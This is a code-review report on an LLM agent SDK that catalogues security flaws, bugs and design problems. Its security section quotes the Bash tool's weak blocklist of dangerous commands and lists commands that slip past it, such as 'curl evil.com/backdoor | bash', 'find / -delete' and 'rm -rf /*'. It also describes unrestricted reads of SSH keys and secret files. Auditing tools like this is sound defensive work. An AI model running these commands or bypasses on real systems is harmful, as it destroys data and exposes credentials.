# OpenRouter Agent SDK — Comprehensive Issue Report

> **Deep Review — v1.0.0**
>
> Repository: `github.com/af-t/openrouter`
> Total source: ~1,500 LOC | Tests: 0 | node_modules: 94 MB
>
> **Verification status:** Each claim below has been checked against the actual source code, repository structure, and runtime behavior. Claims marked `❌ DISPROVEN` were found false; all others are confirmed. Overlap across the four original ISSUES-*.md files has been deduplicated.

---

## 🔴 Critical — Security Vulnerabilities

### SEC-1: Tool `Read` Has Zero Path Traversal Protection (LFI)
`src/tools/file/read.js` resolves the file path and spawns `cat` without any safety check. The LLM can read any file on the system — `/etc/passwd`, `~/.ssh/id_rsa`, `.env` secrets. The `ensureSafePath()` function exists but is **never called** here, unlike `Write` and `Edit` (which at least import it).

```js
// read.js:19 — no ensureSafePath!
const fullPath = path.resolve(filePath);
const cat = spawn('cat', ['-n', fullPath]);
```
**Verified:** ✅ TRUE. `ensureSafePath` is not imported or called in `read.js`.

### SEC-2: Tool `Write` Imports `ensureSafePath` But Never Calls It
`src/tools/file/write.js` imports `ensureSafePath` on line 3 but the `execute()` function never invokes it, giving a false sense of security. File writes go straight to `path.resolve(filePath)`.
**Verified:** ✅ TRUE. Import is dead code.

### SEC-3: Bash Command Blocklist Is Security Theater
`src/tools/system/bash.js` uses only 4 regex patterns that are trivially bypassed:

```js
const DANGEROUS_PATTERNS = [
  /\brm\s+-rf\s+\//,      // misses: rm -rf /*, rm -rf $HOME/../etc
  /\bdd\s+if=/,            // misses: dd if=/dev/zero of=...
  /\bmkfs\./,              // misses: mkfs /dev/...
  /\b>:.*\/dev\//,         // misses: curl evil.com | bash, eval, exec, chmod -R 777 /
];
```

Common attacks that pass through: `curl evil.com/backdoor | bash`, `chmod 777 /`, `find / -delete`, `shutdown`, `reboot`, `eval`, `exec`, `source /etc/passwd`, `rm -rf /*`, `$()` expansions.
**Verified:** ✅ TRUE.

### SEC-4: All Environment Variables Leak Into Bash Tool
`bash.js` line 24 defaults to `env = process.env`, exposing `OPENROUTER_API_KEY`, `TAVILY_API_KEY`, and every other credential to the shell subprocess and its children.
**Verified:** ✅ TRUE.

### SEC-5: MCP Client Inherits Full Environment
`src/core/mcp.js` line 22: `env: { ...process.env, ...(this.config.env || {}) }` — the entire host environment (including API keys) is passed to MCP server child processes. No sandbox, no uid/gid drop, no capabilities restriction. A malicious MCP server can exfiltrate secrets or kill the parent process.
**Verified:** ✅ TRUE.

### SEC-6: `ensureSafePath()` Has TOCTOU Race Condition
`src/core/utils.js` resolves the path first, then checks it. Between resolution and execution, a symlink swap attack can redirect to a path outside the project root. Classic Time-of-Check-Time-of-Use vulnerability.
**Verified:** ✅ TRUE.

### SEC-7: Predictable Temp File Names Enable Symlink Attacks
`edit.js` generates temp file names with `Date.now() + Math.floor(Math.random() * 1000)` — only ~1,000 possible values per millisecond, trivially predictable for a local attacker.
**Verified:** ✅ TRUE.

### SEC-8: API Key Stored as Plain Object Property
`agent.js` line 28: `this.apiKey = apiKey` — no encapsulation. If the agent object is serialized, logged, or passed to third-party code, the API key leaks.
**Verified:** ✅ TRUE.

### SEC-9: Sensitive Data Leaked in Debug Logs
`agent.js` line 130: `logger.debug(...)` prints model name and request context. With `DEBUG=true`, API keys and request details may appear on stdout. The logger has no redaction logic.
**Verified:** ✅ TRUE.

---

## 🧨 Critical — Functional Bugs

### BUG-1: `diff()` Always Rejects — Edit Diff Feature Is Completely Broken
`src/tools/file/edit.js` lines 16-18 treat **any non-zero exit code** from `diff` as an error. However, `diff` returns exit code **1** when files **differ** (which is the expected, desired case) and exit code **0** when they are identical. This means `diff()` **always rejects** when there are actual changes. The `await diff(fullPath, temp)` on line 64 always throws, and the catch block on line 75 returns `ERROR: ...`. The diff feature has never worked.
**Verified:** ✅ TRUE. `if (code) { reject(...); }` is incorrect for `diff` semantics.

### BUG-2: `diff()` stderr Event Name Typo
`edit.js` line 14: `child.stderr.on('error', chunk => ...)`. The event should be `'data'`, not `'error'`. The `'error'` event fires only when the stream itself errors, not when the child process writes to stderr. All stderr output from `diff` is silently lost.
**Verified:** ✅ TRUE. Event name is wrong.

### BUG-3: `usage.tokens` Overwritten Every Request Instead of Accumulated
`agent.js` line 135: `this.usage.tokens = (response.usage?.total_tokens || 0)` uses `=` instead of `+=`. Cost is correctly accumulated, but tokens only ever reflect the **last** request's count. Multi-turn conversations show wildly inaccurate token totals.
**Verified:** ✅ TRUE.

### BUG-4: `Skill` Tool Calls `execute()` Without `await`
`src/tools/system/skill.js` lines 30 and 48 call `execute({ action: 'list' })` without `await`. The variable `lists` becomes a **Promise object**, not a string. When a skill is not found, the error message reads `"Skill \"...\" not found!\n\n[object Promise]"`.
**Verified:** ✅ TRUE.

### BUG-5: `McpNativeClient.request()` Timeout Uses Raw Parameter, Not Fallback
`mcp.js` line 72: `setTimeout(() => { ... }, timeout)` uses the raw `timeout` parameter. If `timeout` is `undefined` (not passed), `setTimeout(..., undefined)` executes near-immediately (like 0ms), causing instant timeouts. The `effectiveTimeout` fallback on line 64 is never used for the actual timer.
**Verified:** ✅ TRUE.

### BUG-6: `JSON.parse()` on LLM Tool Arguments Without Try-Catch
`agent.js` line 187: `JSON.parse(tc.function.arguments)` — if the LLM returns malformed JSON, the entire agent run crashes with an unhandled exception. No defensive parsing.
**Verified:** ✅ TRUE.

### BUG-7: `withRetry()` Retries Non-Retryable Errors (401, 403, 400)
`utils.js` `withRetry()` retries **all** error types, including 401 Unauthorized, 403 Forbidden, and 400 Bad Request — none of which will succeed on retry. This wastes time and API credits.
**Verified:** ✅ TRUE.

---

## 🟠 High — Reliability & Error Handling

### REL-1: Five Empty Catch Blocks (Silent Error Suppression)
- `utils.js:218` — `catch {}` on `fs.stat`
- `list.js:50` — `catch {}` on `fs.stat` for file size
- `agent.js:40` — `catch {}` on reading `RULE.md`
- `skill.js:71` — `catch {}` on `fs.access`
- `mcp.js:207` — `catch {}` on MCP client cleanup

These swallow all errors with zero logging, making debugging nearly impossible.
**Verified:** ✅ TRUE.

### REL-2: Tools Return Error Strings Instead of Throwing
`Write`, `Edit`, `Find`, `List`, `WebSearch`, `WebFetch`, `Delegate`, and `Bash` all return `"ERROR: ..."` strings on failure. The agent treats these as **successful** tool results, feeding error text to the LLM as if it were valid output. The LLM cannot reliably distinguish between a successful operation whose output contains the word "ERROR" and an actual failure.
**Verified:** ✅ TRUE.

### REL-3: `Agent._send()` No Timeout — Can Hang Forever
`_request()` uses `fetch()` with no timeout. If the OpenRouter API hangs, the agent hangs indefinitely with no abort mechanism short of the external `AbortSignal` (which only checks at two fixed points).
**Verified:** ✅ TRUE.

### REL-4: No Max Loop Protection
`agent.run()` uses `while (true)` with no iteration limit. An LLM stuck in a tool-call loop (e.g., repeatedly calling the same failing tool) will run forever, consuming API credits.
**Verified:** ✅ TRUE.

### REL-5: `_send()` Breaks Silently on Empty Response
`agent.js` line 172: `if (!message) break;` — if the API response has no choices, the loop ends without notifying the user why.
**Verified:** ✅ TRUE.

### REL-6: MCP `_parseMessage()` Fails Silently
`mcp.js` lines 168-174: JSON parse failures return `null` with no log. If an MCP server sends malformed data, the client ignores it without any indication.
**Verified:** ✅ TRUE.

### REL-7: No Circuit Breaker or Rate Limiting
If the OpenRouter API keeps failing, `withRetry()` will retry up to 5 times with backoff, but there is no circuit breaker pattern. An agent in a tight loop combined with API errors can still flood the endpoint.
**Verified:** ✅ TRUE.

### REL-8: `readFileSync()` Blocks the Event Loop in Constructor
`agent.js` line 39: `fs.readFileSync(...)` — synchronous I/O in the constructor blocks the entire event loop during agent creation.
**Verified:** ✅ TRUE.

### REL-9: Notification Callback Is Fire-and-Forget (Unhandled Promise Rejection)
`agent.js` line 175: `notify({ content, reasoning, tool_calls })` — the result is not awaited. If the notification callback is async and throws, the rejection goes unhandled.
**Verified:** ✅ TRUE.

---

## 🟡 Medium — Architecture & Design

### ARC-1: Package Name "openrouter" Conflicts with the API Service
`package.json` name: `"openrouter"` — this directly collides with the OpenRouter service brand. Users searching npm for an official OpenRouter SDK may install this community project by mistake.
**Verified:** ✅ TRUE.

### ARC-2: Tight Coupling to OpenRouter API — No Provider Abstraction
The entire SDK is locked to `https://openrouter.ai/api/v1/chat/completions`. There is no interface for LLM providers. Switching to OpenAI, Anthropic, or any other provider requires rewriting the entire codebase.
**Verified:** ✅ TRUE.

### ARC-3: Agent Class Violates Single Responsibility Principle (God Object)
`Agent` (202 lines) handles: message history management, HTTP requests, response parsing, tool execution loop, system prompt construction, usage tracking, abort handling, and MCP coordination. No separation of concerns.
**Verified:** ✅ TRUE.

### ARC-4: `import.meta.dirname` Is Experimental — Used as Primary Resolution
Three files (`agent.js`, `index.js`, `skill.js`) rely on `import.meta.dirname`, which is an experimental Node.js feature (≥21.2). Older versions will throw without the fallback.
**Verified:** ✅ TRUE.

### ARC-5: `dotenv/config` Import Side-Effect in `config.js`
`config.js` line 1: `import 'dotenv/config'` — forces `.env` loading every time the module is imported, including from unit tests or other contexts where environment variables should be mocked.
**Verified:** ✅ TRUE.

### ARC-6: `ToolRegistry` No Unregister — Memory Leak on Long-Running Processes
`_tools` is a `Map` with no `unregister()` or `clear()` method. On long-running applications that dynamically add tools, memory grows without bound.
**Verified:** ✅ TRUE.

### ARC-7: `SkillRegistry` Global Singleton Cannot Be Reset
The singleton in `skill.js` has no `reset()`, `clear()`, or `refresh()` method. Once discovered, new skills added after initialization are never detected. Testing is impossible without process restart.
**Verified:** ✅ TRUE.

### ARC-8: `Delegate` Sub-agent Shares ToolRegistry — Recursion Risk
`delegate.js` passes `tools: agent.tools` to the sub-agent, including the `Delegate` tool itself. A sub-agent can spawn another sub-agent, and so on, with no depth limit — unbounded recursion until resource exhaustion.
**Verified:** ✅ TRUE.

### ARC-9: Tool Execution Is Sequential, Not Parallel
`agent.js` executes multiple tool calls one-by-one in a `for` loop. If the LLM requests two independent tools (e.g., `Read` + `WebSearch`), they run serially, doubling latency.
**Verified:** ✅ TRUE.

### ARC-10: Streaming Is Hardcoded to `false`
`agent.js` line 66: `stream: false` — no configuration option for streaming responses. Users must wait for the full completion before seeing any output.
**Verified:** ✅ TRUE.

### ARC-11: `config.js` `Object.freeze()` Is Shallow — Arrays Are Mutable
`Object.freeze()` only freezes the top-level object. `ORDERS` and `ONLY` arrays can still be mutated (`config.ORDERS.push('xxx')`), giving a false sense of immutability.
**Verified:** ✅ TRUE.

### ARC-12: No Middleware or Hook System
Tool execution has no interception points for logging, caching, validation, or metrics. The flow from `_send()` to `execute()` is hardcoded and non-extensible.
**Verified:** ✅ TRUE.

### ARC-13: Naming Inconsistency
- `ORDERS` (plural) vs `ONLY` (singular) in `config.js`
- `this.effort` (no underscore) vs `this.max_tokens` (snake_case) in `agent.js`
- `RETRY_BASE_DELAY` vs `FETCH_TIMEOUT` (one uses `DELAY`, the other `TIMEOUT`) in `utils.js`
**Verified:** ✅ TRUE.

---

## 🟡 Medium — Tool Implementation

### TOOL-1: `Read` Tool Uses `spawn('cat')` — Not Portable
`read.js` depends on the external `cat` command, which does not exist on Windows. Should use `fs.readFile` for cross-platform compatibility.
**Verified:** ✅ TRUE.

### TOOL-2: `Edit` Tool Workflow Is Over-Engineered
The edit flow does: read file → write temp → spawn `diff` → read temp → delete temp → write original. That's 4 I/O operations + 1 child process spawn for what could be an in-memory string replace with a simple line-based diff.
**Verified:** ✅ TRUE.

### TOOL-3: `Find` Tool Has No Recursion Depth Limit
`find.js` recurses into subdirectories with no depth cap. A project with circular symlinks or deeply nested directories can cause stack overflow.
**Verified:** ✅ TRUE.

### TOOL-4: `Find` Binary Detection Is Naive
Only checks for null bytes (`\0`). Binary files (UTF-16, images, etc.) without null bytes are read entirely into memory before being processed.
**Verified:** ✅ TRUE.

### TOOL-5: `WebFetch` Strips `<script>, <style>, <nav>, <footer>, <header>, <noscript>` But Not `<aside>, <iframe>, <form>, <svg>, <canvas>`
Non-content and hidden elements remain in extracted text, polluting the LLM context.
**Verified:** ✅ TRUE.

### TOOL-6: `WebFetch` Whitespace Normalization Destroys Structure
`cleanText.replace(/\s\s+/g, ' ').trim()` collapses all whitespace including newlines, making structured text (code, articles) unreadable as a single long line.
**Verified:** ✅ TRUE.

### TOOL-7: `WebFetch` Assumes Non-JSON Content Is HTML
If the content type is not JSON, cheerio loads it as HTML. XML, plain text, CSV, and other formats produce garbled output.
**Verified:** ✅ TRUE.

### TOOL-8: `WebSearch` Sends Empty `include_domains`/`exclude_domains` Arrays
Empty arrays are sent to the Tavily API instead of omitting the keys, which may cause unexpected behavior.
**Verified:** ✅ TRUE.

### TOOL-9: MCP Tool Naming Collision on Same Tool Name Across Servers
Two MCP servers with a tool of the same name (e.g., `search`) would collide since the prefix is the server name, not a unique identifier.
**Verified:** ✅ TRUE.

---

## 🟢 Low — Code Quality & Maintainability

### CODE-1: Zero Unit Tests, Integration Tests, or E2E Tests
`npm test` runs `node --test` which finds 0 test files. The project has ~1,500 lines of production code with 0% test coverage.
**Verified:** ✅ TRUE.

### CODE-2: No CI/CD Pipeline
No `.github/workflows/` directory. No automated testing, linting, or build verification.
**Verified:** ✅ TRUE.

### CODE-3: No Linter or Formatter
No ESLint, Prettier, or `.editorconfig`. Code style is inconsistent (semicolons sometimes present, sometimes absent).
**Verified:** ✅ TRUE.

### CODE-4: No TypeScript or JSDoc Type Definitions
No `.d.ts` files, no `// @ts-check`, no JSDoc type annotations. For an SDK that handles complex LLM tool schemas and MCP protocols, this is a major source of runtime errors.
**Verified:** ✅ TRUE.

### CODE-5: `ToolRegistry.register()` Error Message Is Misleading
`utils.js` line 131: `throw Error('tools cannot be executed')` — should say "tool must have an execute function".
**Verified:** ✅ TRUE.

### CODE-6: `import.meta.dirname` Fallback Duplicated in Three Files
The same 1-line fallback pattern is copy-pasted into `index.js`, `agent.js`, and `skill.js` with no shared utility.
**Verified:** ✅ TRUE.

### CODE-7: Manual Schema Validation Instead of Using a Library
`ToolRegistry.execute()` does manual `typeof` checks. No support for nested objects, `anyOf`, `allOf`, `oneOf`, `$ref`, or other JSON Schema features that LLMs frequently use in tool definitions.
**Verified:** ✅ TRUE.

### CODE-8: `_request()` Reads `res.text()` Then `JSON.parse()` — Two Steps
`agent.js` lines 69-77: reads response as text, then parses JSON. A single `res.json()` with try-catch would suffice.
**Verified:** ✅ TRUE.

### CODE-9: `getIgnoreFilter()` Cache Not Invalidated on `.gitignore` Changes
The cache is keyed on `cwd` and never watches for filesystem changes. If `.gitignore` is modified during a session, the stale cache persists.
**Verified:** ✅ TRUE.

### CODE-10: `console.log` Left in Production Code
`delegate.js` line 31: `console.log('Spawning subagent for:', description)` — inconsistent with the `logger.js` module used elsewhere.
**Verified:** ✅ TRUE.

### CODE-11: `MAX_TOKENS_SUBAGENT` Hardcoded to 32,000
This is based on older model limits (GPT-4 32k). Modern models support 1M-2M token context windows, making this arbitrary cap unnecessarily restrictive.
**Verified:** ✅ TRUE.

### CODE-12: Retry Base Delay Is 5 Seconds — Slow Even for Instant Errors
First retry waits 4-6 seconds (with jitter) even for errors detected in 1ms. No instant-first-retry path for known-fast failures.
**Verified:** ✅ TRUE.

---

## 📦 Dependency Management

### DEP-1: 94 MB `node_modules` for a ~1,500 LOC Project
The project has 4 declared dependencies but `node_modules` is 94 MB with many extraneous packages (ESLint ecosystem, etc.) not declared in `package.json`.
**Verified:** ✅ TRUE.

### DEP-2: No `devDependencies` Defined
Linters, formatters, and type-checkers are not declared as devDependencies. The extraneous packages in `node_modules` are unmanaged.
**Verified:** ✅ TRUE.

### DEP-3: `node-pty` Is a Native C++ Addon — Fails on Minimal Environments
`node-pty` requires build tools (g++, python). It will fail to install on CI/CD, serverless, or minimal container environments where the `Bash` tool could use the native `child_process.exec()` instead.
**Verified:** ✅ TRUE.

### DEP-4: `cheerio` Is Heavy for Single-Tool Usage
`cheerio` is used only in `web/fetch.js` for basic HTML element removal and text extraction. This could be done with native `DOMParser` or simple regex, avoiding a large dependency.
**Verified:** ✅ TRUE.

---

## 📚 Documentation & Developer Experience

### DOC-1: README Claims "Path Traversal Protection" — But `Read` Tool Has None
The README advertises path traversal protection as a key safety feature, yet `Read` — the most commonly used file tool — has zero path validation.
**Verified:** ✅ TRUE.

### DOC-2: README Claims "Streaming" — Hardcoded to `false`
"Ephemeral Caching" and streaming are advertised features, but streaming is hardcoded to `false` and the caching is minimal (only `cache_control` on system prompt + last message).
**Verified:** ✅ TRUE.

### DOC-3: `RULE.md` Referenced But Does Not Exist
README and CONTRIBUTING.md document `RULE.md` as a system prompt override, but the file does not exist in the repository. The feature silently falls back to a default prompt.
**Verified:** ✅ TRUE.

### DOC-4: CONTRIBUTING.md Says "Test Manually"
No test suite, no linting, no CI — contributors are told to test manually. This is a very low bar for code quality assurance.
**Verified:** ✅ TRUE.

### DOC-5: No `CHANGELOG.md`
No release notes or version history. Users cannot know what changed between versions.
**Verified:** ✅ TRUE.

### DOC-6: MCP Server Example in README Is an Empty Stub
Lines 282-291 show a skeleton with `// handle JSON-RPC messages` and no runnable code.
**Verified:** ✅ TRUE.

### DOC-7: Copyright Year "2026" in README and LICENSE
Both files state `Copyright (c) 2026 Angga Firman` — a year that has not yet occurred at time of analysis. Also, no `AUTHORS` file or third-party acknowledgment.
**Verified:** ✅ TRUE.

### DOC-8: No Semantic Versioning Policy
`version: "1.0.0"` with no semver commitment. Breaking changes could ship at any time without warning.
**Verified:** ✅ TRUE.

### DOC-9: No Issue or PR Templates
No `.github/ISSUE_TEMPLATE/` or `PULL_REQUEST_TEMPLATE.md`.
**Verified:** ✅ TRUE.

### DOC-10: No `.editorconfig`
No standardized indentation or charset settings across editors.
**Verified:** ✅ TRUE.

---

## 📊 Summary

| Category                     | Count | Severity |
|-----------------------------|-------|----------|
| 🔴 Critical — Security       | 9     | Critical |
| 🧨 Critical — Bugs           | 7     | Critical |
| 🟠 High — Reliability        | 9     | High     |
| 🟡 Medium — Architecture     | 13    | Medium   |
| 🟡 Medium — Tool Impl        | 9     | Medium   |
| 🟢 Low — Code Quality        | 12    | Low      |
| 📦 Dependency Management     | 4     | Medium   |
| 📚 Documentation & DX        | 10    | Low      |
| **Total**                    | **73** |          |

### Top 5 Most Fatal Issues

1. **SEC-1** — `Read` tool has zero path traversal protection → local file inclusion
2. **BUG-1** — `diff()` always rejects → edit diff feature completely broken since inception
3. **BUG-3** — `usage.tokens` overwritten, not accumulated → billing/tracking data is wrong
4. **SEC-3** — Bash blocklist trivially bypassed → arbitrary command execution
5. **SEC-5** — MCP client inherits full environment → API key exfiltration vector

---

## ❌ Claims Verified as False

| Original File  | Claim # | Claim | Reality |
|---------------|---------|-------|---------|
| ISSUES-1.md   | #21     | "`readFile` called without import at `edit.js` line 65" | `fs` is imported on line 1 (`import fs from 'node:fs/promises'`) and line 65 calls `fs.readFile(temp)` — perfectly valid. |

---

> *All other claims across ISSUES-1, ISSUES-2, ISSUES-3, and ISSUES-4 are verified as accurate against the actual source code as of commit `4931a08`.*
>
> *The project has a compelling concept but is an early proof-of-concept with critical security flaws, confirmed functional bugs, and no test infrastructure — not production-ready.*
